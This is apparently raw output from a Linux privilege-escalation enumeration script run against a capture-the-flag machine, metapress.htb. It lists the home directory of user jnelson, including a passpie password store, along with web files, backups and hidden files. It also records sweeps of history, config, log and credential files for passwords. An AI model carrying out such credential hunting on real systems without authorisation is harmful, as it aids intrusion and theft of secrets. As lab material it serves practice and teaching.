-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwx------ 3 jnelson jnelson 4096 Mar 15 18:10 .gnupg
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
drwxr-xr-x 2 jnelson jnelson 4096 Mar 15 17:58 .ssh
-rw-r----- 1 root    jnelson   33 Mar 15 14:44 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/metapress.htb/mailer/send_email.php                                                                                                                                               
/var/www/metapress.htb/mailer/PHPMailer/COMMITMENT
/var/www/metapress.htb/mailer/PHPMailer/src/SMTP.php
/var/www/metapress.htb/mailer/PHPMailer/src/POP3.php
/var/www/metapress.htb/mailer/PHPMailer/src/OAuthTokenProvider.php
/var/www/metapress.htb/mailer/PHPMailer/src/OAuth.php
/var/www/metapress.htb/mailer/PHPMailer/src/Exception.php
/var/www/metapress.htb/mailer/PHPMailer/src/PHPMailer.php
/var/www/metapress.htb/mailer/PHPMailer/get_oauth_token.php
/var/www/metapress.htb/mailer/PHPMailer/LICENSE
/var/www/metapress.htb/mailer/PHPMailer/SECURITY.md
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-ja.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-it.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-hy.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-nl.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-az.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-hu.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-be.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-mn.php
/var/www/metapress.htb/mailer/PHPMailer/language/phpmailer.lang-ro.php

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                           
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                           
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 351 Feb 20  2022 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz                                                                                                     
-rwxr-xr-x 1 root root 43891 Feb 20  2022 /usr/bin/wsrep_sst_mariabackup
-rw-r--r-- 1 root root 10147 Oct 21  2022 /usr/lib/modules/5.10.0-19-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 43896 Aug 24  2022 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so


╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                                 
total 12K
drwxr-xr-x  3 root root     4.0K Oct  5  2022 .
drwxr-xr-x 12 root root     4.0K Oct  5  2022 ..
drwxr-xr-x  4 root www-data 4.0K Oct  5  2022 metapress.htb

/var/www/metapress.htb:
total 16K
drwxr-xr-x 4 root     www-data 4.0K Oct  5  2022 .
drwxr-xr-x 3 root     root     4.0K Oct  5  2022 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 www-data www-data 633 Jun 23  2022 /var/www/metapress.htb/blog/.htaccess                                                                                                      
-rw-r--r-- 1 www-data www-data 620 Nov 12  2020 /var/www/metapress.htb/blog/wp-content/themes/twentytwentyone/.stylelintrc-css.json
-rw-r--r-- 1 www-data www-data 89 Nov 12  2020 /var/www/metapress.htb/blog/wp-content/themes/twentytwentyone/.stylelintignore
-rw-r--r-- 1 www-data www-data 356 Nov 12  2020 /var/www/metapress.htb/blog/wp-content/themes/twentytwentyone/.stylelintrc.json
-rw-r--r-- 1 root root 0 Mar 15 14:44 /run/network/.ifstate.lock
-rw------- 1 root root 0 Jun 26  2022 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug  4  2021 /etc/skel/.bash_logout
-rw-r--r-- 1 jnelson jnelson 220 Jun 26  2022 /home/jnelson/.bash_logout
-r-xr-x--- 1 jnelson jnelson 3 Jun 26  2022 /home/jnelson/.passpie/.config
-rw-r--r-- 1 root root 0 Feb 22  2021 /usr/share/dictionaries-common/site-elisp/.nosearch

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 root root 0 Oct 25  2022 /var/backups/dpkg.arch.0                                                                                                                             
-rw-r--r-- 1 root root 30720 Oct 25  2022 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:@pytest.fixture                                                                                                               
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    @ensure_git()
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    url = 'https://foo@example.com/user/repo.git'
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    url = 'https://foo@example.com/user/repo.git'
/usr/local/lib/python2.7/dist-packages/tests/test_history.py:    url = 'https://foo@example.com/user/repo.git'

╔══════════╣ Searching passwords in config PHP files
/var/www/metapress.htb/blog/wp-admin/setup-config.php:  $pwd    = trim( wp_unslash( $_POST['pwd'] ) );                                                                                     

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                                                 
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/grub/i386-pc/legacy_password_test.mod
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/simple_password_check.so
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-wall.path
/usr/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/mysql_clear_password.so
/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/sha256_password.so
/usr/local/lib/python2.7/dist-packages/passpie/credential.py
/usr/local/lib/python2.7/dist-packages/passpie/credential.pyc
/usr/local/lib/python2.7/dist-packages/tests/test_credential.py
/usr/local/lib/python2.7/dist-packages/tests/test_credential.pyc
/usr/share/man/man1/systemd-ask-password.1.gz
/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/metapress.htb/blog/wp-admin/includes/class-wp-application-passwords-list-table.php
/var/www/metapress.htb/blog/wp-admin/js/application-passwords.js
/var/www/metapress.htb/blog/wp-admin/js/application-passwords.min.js
/var/www/metapress.htb/blog/wp-admin/js/password-strength-meter.js
/var/www/metapress.htb/blog/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/var/www/metapress.htb/blog/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                           
╔══════════╣ Searching passwords inside logs (limit 70)
Fri Mar 15 17:22:05 2024 0 10.10.14.119 2863 /var/www/metapress.htb/blog/wp-admin/js/application-passwords.min.js b _ o r metapress.htb ftp 0 * c                                          
Fri Mar 15 17:22:05 2024 0 10.10.14.119 6147 /var/www/metapress.htb/blog/wp-admin/js/application-passwords.js b _ o r metapress.htb ftp 0 * c
Fri Mar 15 17:22:24 2024 0 10.10.14.119 1119 /var/www/metapress.htb/blog/wp-admin/js/password-strength-meter.min.js b _ o r metapress.htb ftp 0 * c
Fri Mar 15 17:22:24 2024 0 10.10.14.119 4232 /var/www/metapress.htb/blog/wp-admin/js/password-strength-meter.js b _ o r metapress.htb ftp 0 * c



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                         
                                ╚════════════════╝                                                                                                                                         
Regexes to search for API keys aren't activated, use param '-r' 
